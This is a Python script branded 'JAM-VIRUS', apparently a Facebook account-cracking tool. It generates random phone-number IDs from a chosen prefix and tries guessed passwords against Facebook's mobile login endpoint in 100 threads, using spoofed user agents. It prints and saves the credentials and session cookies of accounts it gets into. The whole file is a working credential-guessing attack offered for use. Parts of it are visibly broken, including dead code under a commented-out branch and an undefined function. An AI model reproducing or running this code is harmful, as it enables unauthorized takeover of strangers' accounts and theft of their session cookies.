import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
ugen=[]
uas=[]
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['13' , '14' , '15'])
      y=random.choice(['SM-A037F'])
      c='Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome /'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(5000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
for xd in range(9000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
os.system('xdg-open https://www.facebook.com/jamilmahmud.joy.1')
logo=("""

\033[1;37m   
       _         __  __ _____ _      
      | |  /\   |  \/  |_   _| |     
      | | /  \  | \  / | | | | |     
  _   | |/ /\ \ | |\/| | | | | |     
 | |__| / ____ \| |  | |_| |_| |____ 
  \____/_/    \_\_|  |_|_____|______|                                                                     

\033[1;33m   [A VIRUS FROM TRICK A4IF]
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;45m      [ TOOLS CREATED BY : JAM-VIRUS:/ ]      \033[0;33m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
──────────────────────────────────────────────────
\033[0;33m[+] OWNER    : JAMIL
\033[0;33m[+] FACEBOOK : JAMIL MAHMUD JOY 
\033[0;33m[+] GITHUB   : JAM-VIRUS
\033[0;33m[+] TOOLS    :\33[0;45m FREE / RANDOM\033[0;92m
\033[0;33m────────────────────────────────────────────────── 
""")



A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def mueor():
    user=[]
    os.system('clear')
    os.system('xdg-open https://facebook.com/groups/tricka4ifdefence//')
    print(logo)
    print('\033[0;33m[+] EXAMPLE CODE : 016 017 018 019')
    nude = input('\033[0;33m[\033[0;33m+\033[0;33m] CHOOSE CODE  : ')
    nudex = ''.join(random.choice(string.digits) for _ in range(2))
    nud = ''.join(random.choice(string.digits) for _ in range(2))
    print('\033[0;33m[+] 2000•5000•10000•15000•50000')
    limit = int(input('\033[0;33m[+] ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=100) as MUEOR:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[0;33m──────────────────────────────────────────────────') 
        print('\033[0;33m[+] TOTAL IDZ: '+tl)
        print("\033[0;33m[+] YOUR CODE: "+nude)
        print('\033[0;33m[+] PROCESS HAS BEEN  STARTED')
        print('\033[0;33m[+] WORK COUNTRY BANGLADESH') 
        print('\033[0;33m[+] USE FLIGHT MODE FOR SPEED UP')
        print('\033[0;33m[+] WORKING \33[0;45m [WI-FI / DATA]\033[0;92m')
        print('\033[0;33m──────────────────────────────────────────────────')
        for guru in user:
            uid = nude+nudex+nud+guru
            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'iloveallah']
            MUEOR.submit(rcrack,uid,pwx,tl)
    print('\033[0;37m──────────────────────────────────────────────────')
    print('\033[0;33m[+] Crack Successfully Complete')
    print('\033[0;32m──────────────────────────────────────────────────')
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r \033[1;31m[%sJAM🌼\033[1;36m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[0;33m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://d.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
                'authority': 'd.facebook.com',
    'method':'GET', 
    'path': '/',
    'scheme':'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'dpr': '1.8000000715255737',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-A037F"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent':'Mozilla/5.0 (Linux; arm_64; Android 13; Infinix X6710) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.56 YaBrowser/24.1.9.56.00 SA/3 Mobile Safari/537.36 [ip:62.210.91.82]'
'Mozilla/5.0 (Linux; Android 11; CPH2067 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.119 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/456.0.0.39.90;]'
'Mozilla/5.0 (Linux; Android 12; CPH2009) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36 OPR/81.2.4292.78581'
'Mozilla/5.0 (Linux; Android 12; SM-M115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.119 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/456.0.0.39.90;]'
'Mozilla/5.0 (Linux; Android 14; SM-S916U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.149 Mobile Safari/537.36 OPR/81.3.4292.78688'
'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36 [ip:79.32.111.177]'
'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36 [ip:87.20.77.85]'
'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18F72 [FBAN/FBIOS;FBAV/456.0.0.43.107;FBBV/578727508;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/14.6;FBSS/2;FBID/phone;FBLC/nl_NL;FBOP/5;FBRV/581786264]'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 [ip:79.30.168.136]'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 [ip:151.19.53.204]'
'AppleCoreMedia/1.0.0.22A380 (Macintosh; U; Intel Mac OS X 13_0; id)'
'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36 [ip:31.217.175.186]'
'Mozilla/5.0 (Android 13; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0 [ip:85.190.233.70]'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0 [ip:93.38.25.42]'
'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36 [ip:78.209.0.123]'
'Mozilla/5.0 (Linux; Android 10; moto e(7) Build/QOGS30.569-83-18; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.119 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/456.0.0.39.90;]'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 [ip:88.169.54.98]'
'Mozilla/5.0 (Linux; Android 10; moto g(8) plus Build/QPIS30.28-Q3-28-26-4-1-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.119 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/399.0.0.16.120;]'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 [ip:95.236.218.33]'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 YaBrowser/24.1.0.0 Safari/537.36 [ip:95.24.166.72]',}
            lo = session.post('https://d.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[38;5;46m[JAM-OK💚😽] {uid} | {ps}" '  \n\033[0;33m [💝🥱]\033[1;37mCookie = '+coki+ '')
                print('\033[0;32m──────────────────────────────────────────────────')
                open('/sdcard/JAM-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
#            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[JAM-VIRUS-143-CP🥺💔] {uid} • {ps}")
                open('/sdcard/JAM-VIRUS-143-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass
mueor()
#---------lock check def----------#
def lock_check(uid):
    sessionx=requests.Session()
    urlx=f'https://www.facebook.com/p/{uid}'
    req=bxx(sessionx.get(urlx).content,'html.parser')
    tx=req.find('title').text
    if tx =='Facebook':
        return('LOCK')
    else:
        return('LIVE')
#---------end---------#